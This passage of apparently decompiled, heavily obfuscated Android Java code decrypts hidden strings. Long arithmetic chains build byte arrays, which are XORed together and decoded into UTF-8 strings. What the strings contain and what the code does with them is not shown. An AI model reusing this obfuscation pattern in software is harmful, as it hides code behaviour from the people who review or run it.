                long j23 = j22 | j21;
                long j24 = (((((((j18 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                long j25 = j24 + j23;
                long j26 = ((((((((j17 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j17 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j17 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j17 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + j25;
                long j27 = (j26 >>> 48) & 43690;
                long j28 = ((j27 >>> 2) | (j27 >>> 1)) & 858993459;
                long j29 = ((j28 >>> 2) | j28) & 252645135;
                long j30 = (j26 >>> 32) & 43690;
                long j31 = ((j30 >>> 2) | (j30 >>> 1)) & 858993459;
                long j32 = ((j31 >>> 2) | j31) & 252645135;
                long j33 = ((((j32 >>> 4) | j32) & 16711935) << 16) | ((((j29 >>> 4) | j29) & 16711935) << 24);
                long j34 = (j26 >>> 16) & 43690;
                long j35 = ((j34 >>> 2) | (j34 >>> 1)) & 858993459;
                long j36 = ((j35 >>> 2) | j35) & 252645135;
                long j37 = j26 & 43690;
                long j38 = ((j37 >>> 2) | (j37 >>> 1)) & 858993459;
                long j39 = ((j38 >>> 2) | j38) & 252645135;
                long j40 = 1094527812;
                long j41 = ((int) ((((j39 >>> 4) | j39) & 16711935) | ((((j36 >>> 4) | j36) & 16711935) << 8) | j33)) + 19669248;
                long j42 = ((((((((j40 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j40 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j40 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j40 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j41 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j41 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j41 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j41 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                long j43 = (j42 >>> 48) & 21845;
                long j44 = ((j43 >>> 1) | j43) & 858993459;
                long j45 = ((j44 >>> 2) | j44) & 252645135;
                long j46 = (j42 >>> 32) & 21845;
                long j47 = ((j46 >>> 1) | j46) & 858993459;
                long j48 = ((j47 >>> 2) | j47) & 252645135;
                long j49 = ((((j48 >>> 4) | j48) & 16711935) << 16) + ((((j45 >>> 4) | j45) & 16711935) << 24);
                long j50 = (j42 >>> 16) & 21845;
                long j51 = ((j50 >>> 1) | j50) & 858993459;
                long j52 = ((j51 >>> 2) | j51) & 252645135;
                long j53 = j42 & 21845;
                long j54 = ((j53 >>> 1) | j53) & 858993459;
                long j55 = ((j54 >>> 2) | j54) & 252645135;
                x(bArr, new byte[]{7, -58, -92, 20, -16, -44, 21, 75, 9, 57, 114, 5, -50, -104, 40, (int) ((((j55 >>> 4) | j55) & 16711935) + ((((j52 >>> 4) | j52) & 16711935) << 8) + j49), -34, -100, 97, -15, -11, 121, 11, -86, 30, 55, 76});
                Charset charset = StandardCharsets.UTF_8;
                String intern = new String(bArr, charset).intern();
                byte[] bArr2 = new byte[37];
                bArr2[0] = 20;
                bArr2[1] = 25;
                bArr2[2] = 117;
                bArr2[3] = -67;
                long j56 = 101518627;
                long j57 = j20 | j19;
                long j58 = j22 | j57;
                long j59 = j24 + j58;
                long j60 = ((((((((j56 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j56 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j56 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j56 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j59;
                long j61 = (j60 >>> 48) & 43690;
                long j62 = ((j61 >>> 2) | (j61 >>> 1)) & 858993459;
                long j63 = ((j62 >>> 2) | j62) & 252645135;
                long j64 = (j60 >>> 32) & 43690;
                long j65 = ((j64 >>> 2) | (j64 >>> 1)) & 858993459;
                long j66 = ((j65 >>> 2) | j65) & 252645135;
                long j67 = ((((j66 >>> 4) | j66) & 16711935) << 16) + ((((j63 >>> 4) | j63) & 16711935) << 24);
                long j68 = (j60 >>> 16) & 43690;
                long j69 = ((j68 >>> 2) | (j68 >>> 1)) & 858993459;
                long j70 = ((j69 >>> 2) | j69) & 252645135;
                long j71 = j60 & 43690;
                long j72 = ((j71 >>> 2) | (j71 >>> 1)) & 858993459;
                long j73 = ((j72 >>> 2) | j72) & 252645135;
                long j74 = 679478356;
                long j75 = 0;
                long j76 = (((((j75 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845;
                long j77 = (((((((j75 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16;
                long j78 = j77 + j76;
                long j79 = (((((((j75 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32;
                long j80 = j79 | j78;
                long j81 = (((((((j75 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48;
                long j82 = j81 | j80;
                long j83 = ((((((((j74 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j74 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j74 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j74 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + j82;
                long j84 = (j83 >>> 48) & 43690;
                long j85 = ((j84 >>> 2) | (j84 >>> 1)) & 858993459;
                long j86 = ((j85 >>> 2) | j85) & 252645135;
                long j87 = (j83 >>> 32) & 43690;
                long j88 = ((j87 >>> 2) | (j87 >>> 1)) & 858993459;
                long j89 = ((j88 >>> 2) | j88) & 252645135;
                long j90 = ((((j89 >>> 4) | j89) & 16711935) << 16) | ((((j86 >>> 4) | j86) & 16711935) << 24);
                long j91 = (j83 >>> 16) & 43690;
                long j92 = ((j91 >>> 2) | (j91 >>> 1)) & 858993459;
                long j93 = ((j92 >>> 2) | j92) & 252645135;
                long j94 = j83 & 43690;
                long j95 = ((j94 >>> 2) | (j94 >>> 1)) & 858993459;
                long j96 = ((j95 >>> 2) | j95) & 252645135;
                bArr2[(((int) ((((j73 >>> 4) | j73) & 16711935) | (((((j70 >>> 4) | j70) & 16711935) << 8) + j67))) + (((int) ((((j96 >>> 4) | j96) & 16711935) + (((((j93 >>> 4) | j93) & 16711935) << 8) | j90))) | 698396756)) ^ 799915379] = 70;
                bArr2[5] = 11;
                bArr2[6] = -107;
                bArr2[7] = -18;
                bArr2[8] = -7;
                bArr2[9] = 63;
                bArr2[10] = 84;
                bArr2[11] = 20;
                bArr2[12] = 92;
                bArr2[13] = 7;
                bArr2[14] = 14;
                bArr2[15] = -32;
                bArr2[16] = -3;
                bArr2[17] = -77;
                bArr2[18] = 51;
                bArr2[19] = 58;
                bArr2[20] = -20;
                bArr2[21] = 21;
                bArr2[22] = -63;
                bArr2[23] = -106;
                bArr2[24] = -114;
                bArr2[25] = -56;
                bArr2[26] = 53;
                bArr2[27] = 95;
                long j97 = j79 + j78;
                long j98 = j81 + j97;
                long j99 = j22 + j21;
                long j100 = j24 + j99;
                long j101 = j100 + j98;
                long j102 = (j101 >>> 48) & 21845;
                long j103 = ((j102 >>> 1) | j102) & 858993459;
                long j104 = ((j103 >>> 2) | j103) & 252645135;
                long j105 = (j101 >>> 32) & 21845;
                long j106 = ((j105 >>> 1) | j105) & 858993459;
                long j107 = ((j106 >>> 2) | j106) & 252645135;
                long j108 = ((((j107 >>> 4) | j107) & 16711935) << 16) + ((((j104 >>> 4) | j104) & 16711935) << 24);
                long j109 = (j101 >>> 16) & 21845;
                long j110 = ((j109 >>> 1) | j109) & 858993459;
                long j111 = ((j110 >>> 2) | j110) & 252645135;
                long j112 = j101 & 21845;
                long j113 = ((j112 >>> 1) | j112) & 858993459;
                long j114 = ((j113 >>> 2) | j113) & 252645135;
                int i4 = ((((int) ((((j114 >>> 4) | j114) & 16711935) | (((((j111 >>> 4) | j111) & 16711935) << 8) + j108))) | (-1399107807)) & 675351168) + 268473424;
                bArr2[28] = B0.a((~i4) | 943824541, 943824541 - i4);
                bArr2[29] = -93;
                bArr2[30] = -6;
                bArr2[31] = 75;
                bArr2[32] = -40;
                bArr2[33] = -31;
                bArr2[34] = 39;
                long j115 = 1988239380;
                long j116 = j24 | j23;
                long j117 = ((((((((j115 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((j115 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j115 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j115 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j116;
                long j118 = (j117 >>> 48) & 43690;
                long j119 = ((j118 >>> 2) | (j118 >>> 1)) & 858993459;
                long j120 = ((j119 >>> 2) | j119) & 252645135;
                long j121 = (j117 >>> 32) & 43690;
                long j122 = ((j121 >>> 2) | (j121 >>> 1)) & 858993459;
                long j123 = ((j122 >>> 2) | j122) & 252645135;
                long j124 = ((((j123 >>> 4) | j123) & 16711935) << 16) + ((((j120 >>> 4) | j120) & 16711935) << 24);
                long j125 = (j117 >>> 16) & 43690;
                long j126 = ((j125 >>> 2) | (j125 >>> 1)) & 858993459;
                long j127 = ((j126 >>> 2) | j126) & 252645135;
                long j128 = j117 & 43690;
                long j129 = ((j128 >>> 2) | (j128 >>> 1)) & 858993459;
                long j130 = ((j129 >>> 2) | j129) & 252645135;
                bArr2[(((int) ((((j130 >>> 4) | j130) & 16711935) + (((((j127 >>> 4) | j127) & 16711935) << 8) + j124))) + 18875394) ^ 2007114805] = 8;
                bArr2[36] = 39;
                byte[] bArr3 = new byte[37];
                bArr3[0] = 117;
                bArr3[1] = 119;
                bArr3[2] = 17;
                bArr3[3] = -49;
                bArr3[4] = 41;
                bArr3[5] = 98;
                bArr3[6] = -15;
                bArr3[7] = -64;
                bArr3[8] = -119;
                bArr3[9] = 90;
                bArr3[10] = 38;
                bArr3[11] = 121;
                bArr3[12] = 53;
                bArr3[13] = 116;
                bArr3[14] = 125;
                bArr3[15] = -119;
                bArr3[16] = -110;
                bArr3[17] = -35;
                bArr3[18] = 29;
                bArr3[19] = 124;
                bArr3[20] = -93;
                bArr3[21] = 71;
                bArr3[22] = -124;
                long j131 = 304547132;
                long j132 = (((((((((j131 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j131 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j131 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j131 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + j25 + 6148914691236517205L;
                long j133 = (j132 >>> 48) & 43690;
                long j134 = ((j133 >>> 2) | (j133 >>> 1)) & 858993459;
                long j135 = ((j134 >>> 2) | j134) & 252645135;
                long j136 = (j132 >>> 32) & 43690;
                long j137 = ((j136 >>> 2) | (j136 >>> 1)) & 858993459;
                long j138 = ((j137 >>> 2) | j137) & 252645135;
                long j139 = ((((j138 >>> 4) | j138) & 16711935) << 16) | ((((j135 >>> 4) | j135) & 16711935) << 24);
                long j140 = (j132 >>> 16) & 43690;
                long j141 = ((j140 >>> 2) | (j140 >>> 1)) & 858993459;
                long j142 = ((j141 >>> 2) | j141) & 252645135;
                long j143 = j132 & 43690;
                long j144 = ((j143 >>> 2) | (j143 >>> 1)) & 858993459;
                long j145 = ((j144 >>> 2) | j144) & 252645135;
                bArr3[(3079 - (~(((int) ((((j145 >>> 4) | j145) & 16711935) + (((((j142 >>> 4) | j142) & 16711935) << 8) | j139))) & 33645313))) ^ 33648414] = -47;
                bArr3[24] = -36;
                bArr3[25] = -121;
                bArr3[26] = 96;
                bArr3[27] = 17;
                bArr3[28] = 9;
                bArr3[29] = -4;
                long j146 = -258147790;
                long j147 = 258147739;
                long j148 = (((((((((j146 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j146 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j146 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j146 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + (((((((((j147 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j147 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j147 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j147 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)));
                long j149 = (j148 >>> 48) & 21845;
                long j150 = ((j149 >>> 1) | j149) & 858993459;
                long j151 = ((j150 >>> 2) | j150) & 252645135;
                long j152 = (j148 >>> 32) & 21845;
                long j153 = ((j152 >>> 1) | j152) & 858993459;
                long j154 = ((j153 >>> 2) | j153) & 252645135;
                long j155 = ((((j154 >>> 4) | j154) & 16711935) << 16) + ((((j151 >>> 4) | j151) & 16711935) << 24);
                long j156 = (j148 >>> 16) & 21845;
                long j157 = ((j156 >>> 1) | j156) & 858993459;
                long j158 = ((j157 >>> 2) | j157) & 252645135;
                long j159 = j148 & 21845;
                long j160 = ((j159 >>> 1) | j159) & 858993459;
                long j161 = ((j160 >>> 2) | j160) & 252645135;
                bArr3[30] = (int) ((((j161 >>> 4) | j161) & 16711935) + ((((j158 >>> 4) | j158) & 16711935) << 8) + j155);
                bArr3[31] = 14;
                bArr3[32] = -118;
                bArr3[33] = -73;
                bArr3[34] = 110;
                bArr3[35] = 75;
                bArr3[36] = 98;
                x(bArr2, bArr3);
                String intern2 = new String(bArr2, charset).intern();
                byte[] bArr4 = new byte[37];
                bArr4[0] = -99;
                bArr4[1] = -38;
                long j162 = 537018464;
                long j163 = j81 | j97;
                long b5 = c3.b((((((((j162 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j162 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j162 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j162 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), j163, 6148914691236517205L);
                long j164 = (b5 >>> 48) & 43690;
                long j165 = ((j164 >>> 2) | (j164 >>> 1)) & 858993459;
                long j166 = ((j165 >>> 2) | j165) & 252645135;
                long j167 = (b5 >>> 32) & 43690;
                long j168 = ((j167 >>> 2) | (j167 >>> 1)) & 858993459;
                long j169 = ((j168 >>> 2) | j168) & 252645135;
                long j170 = ((((j169 >>> 4) | j169) & 16711935) << 16) | ((((j166 >>> 4) | j166) & 16711935) << 24);
                long j171 = (b5 >>> 16) & 43690;
                long j172 = ((j171 >>> 2) | (j171 >>> 1)) & 858993459;
                long j173 = ((j172 >>> 2) | j172) & 252645135;
                long j174 = b5 & 43690;
                long j175 = ((j174 >>> 2) | (j174 >>> 1)) & 858993459;
                long j176 = ((j175 >>> 2) | j175) & 252645135;
                bArr4[(-1438158495) ^ ((-1975176957) + ((int) ((((j176 >>> 4) | j176) & 16711935) + (((((j173 >>> 4) | j173) & 16711935) << 8) | j170))))] = 42;
                bArr4[3] = -40;
                bArr4[4] = 104;
                bArr4[5] = -74;
                bArr4[6] = -44;
                bArr4[7] = -122;
                bArr4[8] = -71;
                bArr4[9] = 37;
                bArr4[10] = -40;
                bArr4[11] = 29;
                bArr4[12] = 90;
                bArr4[13] = -68;
                bArr4[14] = 126;
                bArr4[15] = -87;
                bArr4[16] = 74;
                bArr4[17] = 72;
                bArr4[18] = -77;
                bArr4[19] = 91;
                bArr4[20] = 94;
                bArr4[21] = 61;
                bArr4[22] = 60;
                bArr4[23] = 71;
                bArr4[24] = 22;
                long j177 = -800573996;
                long a2 = S.a(0, -1, 4195466, -804769468);
                long j178 = (((((((((j177 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j177 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | (((((((((j177 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j177 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845))) + ((((((((a2 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + (((((((((a2 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((a2 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((a2 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                long j179 = (j178 >>> 48) & 21845;
                long j180 = ((j179 >>> 1) | j179) & 858993459;
                long j181 = ((j180 >>> 2) | j180) & 252645135;
                long j182 = (j178 >>> 32) & 21845;
                long j183 = ((j182 >>> 1) | j182) & 858993459;
                long j184 = ((j183 >>> 2) | j183) & 252645135;
                long j185 = ((((j184 >>> 4) | j184) & 16711935) << 16) + ((((j181 >>> 4) | j181) & 16711935) << 24);
                long j186 = (j178 >>> 16) & 21845;
                long j187 = ((j186 >>> 1) | j186) & 858993459;
                long j188 = ((j187 >>> 2) | j187) & 252645135;
                long j189 = j178 & 21845;
                long j190 = ((j189 >>> 1) | j189) & 858993459;
                long j191 = ((j190 >>> 2) | j190) & 252645135;
                bArr4[(int) (((((j188 >>> 4) | j188) & 16711935) << 8) | j185 | (((j191 >>> 4) | j191) & 16711935))] = 77;
                bArr4[26] = 16;
                bArr4[27] = -70;
                bArr4[28] = 34;
                bArr4[29] = -6;
                bArr4[30] = 67;
                long j192 = 134554680;
                long j193 = j77 | j76;
                long j194 = j79 + j193;
                long j195 = j81 + j194;
                long b6 = c3.b((((((((j192 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j192 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j192 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j192 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)), j195, 6148914691236517205L);
                long j196 = (b6 >>> 48) & 43690;
                long j197 = ((j196 >>> 2) | (j196 >>> 1)) & 858993459;
                long j198 = ((j197 >>> 2) | j197) & 252645135;
                long j199 = (b6 >>> 32) & 43690;
                long j200 = ((j199 >>> 2) | (j199 >>> 1)) & 858993459;
                long j201 = ((j200 >>> 2) | j200) & 252645135;
                long j202 = ((((j201 >>> 4) | j201) & 16711935) << 16) + ((((j198 >>> 4) | j198) & 16711935) << 24);
                long j203 = (b6 >>> 16) & 43690;
                long j204 = ((j203 >>> 2) | (j203 >>> 1)) & 858993459;
                long j205 = ((j204 >>> 2) | j204) & 252645135;
                long j206 = b6 & 43690;
                long j207 = ((j206 >>> 2) | (j206 >>> 1)) & 858993459;
                long j208 = ((j207 >>> 2) | j207) & 252645135;
                int i5 = 178208486 ^ (43653825 + ((int) ((((j208 >>> 4) | j208) & 16711935) | (((((j205 >>> 4) | j205) & 16711935) << 8) | j202))));
                long j209 = -1856130097;
                long j210 = 1856130158;
                long j211 = ((((((((j209 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j209 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j209 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j209 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)) + (((((((((j210 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | ((((((((j210 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) | ((((((((j210 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j210 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845));
                long j212 = (j211 >>> 48) & 21845;
                long j213 = ((j212 >>> 1) | j212) & 858993459;
                long j214 = ((j213 >>> 2) | j213) & 252645135;
                long j215 = (j211 >>> 32) & 21845;
                long j216 = ((j215 >>> 1) | j215) & 858993459;
                long j217 = ((j216 >>> 2) | j216) & 252645135;
                long j218 = ((((j217 >>> 4) | j217) & 16711935) << 16) | ((((j214 >>> 4) | j214) & 16711935) << 24);
                long j219 = (j211 >>> 16) & 21845;
                long j220 = ((j219 >>> 1) | j219) & 858993459;
                long j221 = ((j220 >>> 2) | j220) & 252645135;
                long j222 = j211 & 21845;
                long j223 = (j222 | (j222 >>> 1)) & 858993459;
                long j224 = (j223 | (j223 >>> 2)) & 252645135;
                bArr4[i5] = (int) (((j224 | (j224 >>> 4)) & 16711935) | (((((j221 >>> 4) | j221) & 16711935) << 8) + j218));
                bArr4[32] = 74;
                bArr4[33] = 57;
                bArr4[34] = -99;
                bArr4[35] = 110;
                bArr4[36] = 103;
                byte[] bArr5 = new byte[37];
                bArr5[0] = -4;
                bArr5[1] = -76;
                bArr5[2] = 78;
                bArr5[3] = -86;
                bArr5[4] = 7;
                bArr5[5] = -33;
                bArr5[6] = -80;
                bArr5[7] = -88;
                long j225 = 236029292;
                long j226 = j81 | j194;
                long j227 = (((((((((j225 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) | (((((((((j225 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + (((((((((j225 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) | ((((((j225 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845)))) + j226;
                long j228 = (j227 >>> 48) & 43690;
                long j229 = ((j228 >>> 2) | (j228 >>> 1)) & 858993459;
                long j230 = ((j229 >>> 2) | j229) & 252645135;
                long j231 = (j227 >>> 32) & 43690;
                long j232 = ((j231 >>> 2) | (j231 >>> 1)) & 858993459;
                long j233 = ((j232 >>> 2) | j232) & 252645135;
                long j234 = ((((j233 >>> 4) | j233) & 16711935) << 16) | ((((j230 >>> 4) | j230) & 16711935) << 24);
                long j235 = (j227 >>> 16) & 43690;
                long j236 = ((j235 >>> 2) | (j235 >>> 1)) & 858993459;
                long j237 = ((j236 >>> 2) | j236) & 252645135;
                long j238 = j227 & 43690;
                long j239 = ((j238 >>> 2) | (j238 >>> 1)) & 858993459;
                long j240 = ((j239 >>> 2) | j239) & 252645135;
                int i6 = R.attr.titleTextAppearance + ((int) ((((j240 >>> 4) | j240) & 16711935) | ((((j237 >>> 4) | j237) & 16711935) << 8) | j234)) + (((-r2) - 1) | (-16843822));
                int i7 = (i6 & (-1364016830)) + ((-1364016830) | i6);
                bArr5[((-1347173017) | i7) - ((-1347173017) & i7)] = -55;
                bArr5[9] = 64;
                bArr5[10] = -86;
                bArr5[11] = 112;
                bArr5[12] = 51;
                bArr5[13] = -49;
                bArr5[14] = 13;
                bArr5[15] = -64;
                bArr5[16] = 37;
                long j241 = 369639424;
                long b7 = c3.b((((((((j241 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48, ((((((((j241 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j241 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j241 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845), j195, 6148914691236517205L);
                long j242 = (b7 >>> 48) & 43690;
                long j243 = ((j242 >>> 2) | (j242 >>> 1)) & 858993459;
                long j244 = ((j243 >>> 2) | j243) & 252645135;
                long j245 = (b7 >>> 32) & 43690;
                long j246 = ((j245 >>> 2) | (j245 >>> 1)) & 858993459;
                long j247 = ((j246 >>> 2) | j246) & 252645135;
                long j248 = ((((j247 >>> 4) | j247) & 16711935) << 16) | ((((j244 >>> 4) | j244) & 16711935) << 24);
                long j249 = (b7 >>> 16) & 43690;
                long j250 = ((j249 >>> 2) | (j249 >>> 1)) & 858993459;
                long j251 = ((j250 >>> 2) | j250) & 252645135;
                long j252 = b7 & 43690;
                long j253 = ((j252 >>> 2) | (j252 >>> 1)) & 858993459;
                long j254 = (j253 | (j253 >>> 2)) & 252645135;
                int i8 = 1444732277 ^ (1075092836 + ((int) (((j254 | (j254 >>> 4)) & 16711935) + (((((j251 >>> 4) | j251) & 16711935) << 8) + j248))));
                long j255 = 61349888;
                long j256 = ((((((((j255 >>> 24) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 48) + ((((((((j255 >>> 16) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 32) + ((((((((j255 >>> 8) & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) << 16) + ((((((j255 & 255) * 72340172838076673L) & (-9205322385119247871L)) * 72624976668147841L) >>> 49) & 21845) + j226;
                long j257 = (j256 >>> 48) & 43690;
                long j258 = ((j257 >>> 2) | (j257 >>> 1)) & 858993459;
                long j259 = ((j258 >>> 2) | j258) & 252645135;
                long j260 = (j256 >>> 32) & 43690;
                long j261 = ((j260 >>> 2) | (j260 >>> 1)) & 858993459;
                long j262 = ((j261 >>> 2) | j261) & 252645135;
                long j263 = ((((j262 >>> 4) | j262) & 16711935) << 16) + ((((j259 >>> 4) | j259) & 16711935) << 24);
                long j264 = (j256 >>> 16) & 43690;
                long j265 = ((j264 >>> 2) | (j264 >>> 1)) & 858993459;
                long j266 = ((j265 >>> 2) | j265) & 252645135;
                long j267 = j256 & 43690;
                long j268 = ((j267 >>> 2) | (j267 >>> 1)) & 858993459;
                long j269 = ((j268 >>> 2) | j268) & 252645135;
                int i9 = (int) ((((j269 >>> 4) | j269) & 16711935) | ((((j266 >>> 4) | j266) & 16711935) << 8) | j263);
                bArr5[i8] = (((i9 | 1001928628) * 2) - ((60297760 | i9) ^ 941630868)) ^ 1001928594;
                bArr5[18] = -99;
                bArr5[19] = 10;
                long j270 = j22 + j57;
                long j271 = j24 + j270;
                long j272 = j271 + j163;
                long j273 = (j272 >>> 48) & 21845;
                long j274 = ((j273 >>> 1) | j273) & 858993459;
                long j275 = ((j274 >>> 2) | j274) & 252645135;
                long j276 = (j272 >>> 32) & 21845;
                long j277 = ((j276 >>> 1) | j276) & 858993459;
                long j278 = ((j277 >>> 2) | j277) & 252645135;
                long j279 = ((((j278 >>> 4) | j278) & 16711935) << 16) | ((((j275 >>> 4) | j275) & 16711935) << 24);
                long j280 = (j272 >>> 16) & 21845;
                long j281 = ((j280 >>> 1) | j280) & 858993459;
                long j282 = ((j281 >>> 2) | j281) & 252645135;
                long j283 = j272 & 21845;
                long j284 = ((j283 >>> 1) | j283) & 858993459;
                long j285 = ((j284 >>> 2) | j284) & 252645135;
